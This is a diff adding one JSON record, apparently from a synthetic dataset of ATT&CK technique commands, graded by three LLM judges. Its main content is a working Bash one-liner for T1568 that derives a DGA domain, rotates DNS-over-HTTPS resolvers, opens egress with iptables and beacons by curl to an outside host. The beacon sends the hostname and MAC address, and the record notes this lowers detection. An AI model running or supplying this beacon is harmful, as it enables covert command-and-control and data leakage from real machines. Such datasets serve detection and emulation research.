@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"kappa\"; LABEL=$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d%H%M)\" | sha1sum | cut -c1-10); FQDN=\"${LABEL}.cdn-route.xyz\"; PORT=4433; DOH=$(shuf -e https://cloudflare-dns.com/dns-query https://dns.google/dns-query https://dns.quad9.net/dns-query -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; curl -sSf --doh-url \"$DOH\" --max-time 5 --retry 1 --header \"X-Client: $(hostname -s)\" \"https://${FQDN}:${PORT}/beacon?mac=$(cat /sys/class/net/*/address 2>/dev/null | head -n1)\"",
+  "explanation": "Rotates DoH resolvers to dynamically resolve a minute-based DGA domain and beacons over port 4433, reducing detection via varied resolution paths and ports.",
+  "rationale_steps": [
+    "Generate fast-rotating DGA domain",
+    "Randomly choose a DoH provider",
+    "Open egress to nonstandard TLS port",
+    "Send beacon with minimal timing window"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-e18bbd99",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignments, balanced quotes, correct command separators, valid flags for all tools used (curl, iptables, date, etc.), and proper command substitution syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using a deterministic DGA algorithm (SHA1 of seed+timestamp), rotating DoH resolvers, establishing a beacon to the generated domain, and including proper network configuration (iptables) to enable the communication.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:39:21.635966Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, valid flags, and correct command substitutions and piping throughout its execution.",
+        "semantic_score": 3,
+        "semantic_justification": "While the DGA, DoH rotation, and beaconing logic align well with the technique, the `iptables` command requires root privileges, which contradicts the stated \"Privilege: None\" and would cause a failure in opening the specified port for the beacon.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:39:39.510858Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and substitutions with valid flags and separators (printf/sha1sum/cut, shuf -e -n1, iptables args, curl --doh-url) make it well-formed and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It generates a minute-based DGA label, resolves via a randomly chosen DoH endpoint, and beacons to the derived FQDN on port 4433 (consistent with T1568), though iptables likely fails without root and the port is fixed rather than rotated.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T07:39:47.586059Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
